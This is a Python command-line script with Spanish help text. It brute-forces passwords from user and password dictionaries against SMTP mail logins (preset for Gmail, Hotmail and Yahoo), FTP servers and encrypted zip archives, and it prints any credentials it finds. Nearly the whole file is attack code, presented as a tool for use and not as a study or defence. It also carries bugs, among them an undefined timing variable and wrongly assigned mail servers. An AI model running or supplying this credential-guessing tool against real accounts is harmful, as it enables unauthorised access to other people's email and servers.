#!/usr/bin/python
#-*-coding: utf-8-*-
from sys import argv
from ftplib import FTP 
from time import sleep
from smtplib import SMTP
import zipfile


def bforcezip(zipf, passwords):
	try:
		zf = zipfile.ZipFile(zipf)
	except Exception as e:
		print("Problemas al abrir '{}'\n{}".format(zipf, e))
		exit()
	for password in passwords:
		try:
			zf.extractall(pwd=password)
		except:
			print("'{}' no es la contraseña del archivo.".format(password))
		else:
			print("'{}' es la contraseña de {}.".format(password, zf))
			exit()
def bforcemail(users, passwords, server):
	server = SMTP(server)
	server.starttls()
	for user in users:
		for password in passwords:
			try:
				server.login(user, password)
			except Exception as e:
				print("{} probablemente no es la clave de {}\n\n{}".format(password, user, e))
			else:
				print("{} es la clave de {}".format(password, user))
				exit()
		sleep(3)
	server.quit()
def bforceftp(users, passwords, server, tm):
	conexion = FTP(server)
	for user in users:
		for password in passwords:
			try:
				conexion.login(user, password)
			except Exception as e:
				print("\n[*]{}".format(e))
				sleep(tm)
			else:
				print("Servidor: {}".format(server))
				print("Usuario: {}".format(user))				
				print("Clave: {}".format(password))
				exit()
	conexion.quit()

				

def listaup(lista, count):
	if len(lista) >= 1:
		lista.append(lista[0])
		lista[0] = argv[count + 1]
	else:
		lista.append(argv[count + 1])
	return lista

def listaupf(lista, count):
	try:
		file = open(argv[count + 1], "r")
	except:
		print("No se pudo encontrar el siguiente archivo:\n{}".format(argv[count + 1]))
		exit()
	else:
		for line in file:
			lista.append(line)
		file.close()
		return lista

def h():
	print("\nOpciones:")
	print("\nSe debe de especificar que se va a atacar:\nftp, smtp o un archivo.zip.")
	print("\nmail: --mail\nftp: --ftp\n--zip\n\nLas banderas que se pueden usar en los 3 prametros:")
	print("\n-u:  Se usa para establecer con que usuario ingresar (no sirve para el modo --zip).\n-uf: Establecer diccionario de usuarios (no sirve para el modo --zip).")
	print("-p:  Sirve para establecer una contraseña.\n-pf: Establecer diccionario de contraseñas.")
	#print("-t:  Sirve para establecer el tiempo entre cada intento.")
	print("\nSolo hay una bandera exclusiva para ftp:\n\n-hst:  Sirve para establecer la dirección del servidor.")
	print("\nBanderas para --mail:")
	print("\n\nSi se usa --mail debe usarse -gm, -hm o -yh, para escoger gmail, hotmail o yahoo.")
	print("Tambien puedes usar -o para escoger tu propio servidor smtp:\n-o dominiosmtp:puerto .")
	print("\n--zip:\n-file: Determinar la ruta del archivo.zip.")

if __name__ == '__main__':
	if len(argv) == 1:
		print("{} -h para ver las opciones.".format(argv[0]))
	elif len(argv) == 2 and argv[1] == "-h":
		h()
	else:
		userslist = []
		passwordlist = []
		ip = str()
		argcount = 1
		fl = str()
		#time = 5
		ftp, mail = False, False
		options = {"gm": False, "hm": False, "yh": False, "o": False}
		mainopt = {"mail": False, "ftp": False, "zip":False}
		for arg in argv[1:]:
			if arg[0] != "-":
				argcount += 1
				continue
			if arg == "--ftp":
				mainopt["ftp"] = True
				argcount += 1
				continue
			elif arg == "--zip":
				mainopt["zip"] = True
				argcount += 1
				continue
			elif arg == "--mail":
				mainopt["mail"] = True
				srv = str()
				argcount += 1
				continue
			if arg == "-uf":
				listaupf(userslist, argcount)
			elif arg == "-u":
				listaup(userslist, argcount)
			elif arg == "-hst":
				ip = argv[argcount + 1]
			elif arg == "-pf":
				listaupf(passwordlist, argcount)
			elif arg == "-p":
				listaup(passwordlist, argcount)
			elif arg == "-gm":
				options["gm"] = True
				srv = 'smtp.gmail.com:587'
			elif arg == "-hm":
				options["hm"] = True
			elif arg == "-yh":
				srv = 'smtp.live.com:587'
				options["yh"] = True
				srv = 'smtp.mail.yahoo.com:25'
			elif arg == "-o":
				srv = argv[argcount + 1]
				options["o"] = True
			elif arg == "-file":
				fl = argv[argcount + 1]
			else:
				print("No se reconoce '{}' como una bandera.".format(arg))
				exit()
			argcount += 1
			optcount = 0
			for option in options:
				if options[option] == True:
					optcount += 1
				if optcount > 1:
					print("No se puede usar 2 servidores smtp al mismo tiempo.")
					exit()
			optcount = 0
			for option in mainopt:
				if mainopt[option] == True:
					optcount += 1
				if optcount > 1:
					print("No se puede usar más de una función al mismo tiempo.")
					exit()
			
		if ftp == True and ip == "":
			print("para usar --ftp se ocupa determinar una ip:\n-hst (ip del servidor ftp)")
			exit()
		elif mainopt["ftp"] == True:
			bforceftp(userslist, passwordlist, ip, time)
		elif mainopt["mail"] == True and srv != "":
			bforcemail(userslist, passwordlist, srv)
		elif mainopt	["mail"] == True and srv == "":
			print("No se ha elegido un servidor smtp.")
			exit()
		elif mainopt["zip"] == True and fl != "":
			bforcezip(fl, passwordlist)
		else:
			print("No se ha establecido un archivo al cual atacar.")
			exit()